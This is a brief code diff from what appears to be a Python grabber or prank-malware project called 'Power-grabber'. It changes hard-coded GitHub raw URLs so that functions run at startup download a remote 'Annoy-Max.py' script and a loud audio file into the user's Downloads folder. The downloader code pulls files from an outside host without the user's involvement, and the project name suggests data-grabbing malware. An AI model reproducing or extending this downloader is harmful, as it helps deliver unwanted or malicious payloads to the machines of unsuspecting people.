@@ -2,7 +2,7 @@ import requests
 import os
 import shutil
 def download_another_file():
-    url = "https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Annoy-Max.py"
+    url = "https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Annoy-Max.py"
     response = requests.get(url)
     downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
     file_path = os.path.join(downloads_path, "Annoy-Max.py")
@@ -16,7 +16,7 @@ def download_another_file():
         print("Failed to download file")
 download_another_file()
 def download_audio():
-    url = "https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Loud"
+    url = "https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/main/Loud"
     response = requests.get(url)
     downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
     file_path = os.path.join(downloads_path, "loud.mp3")
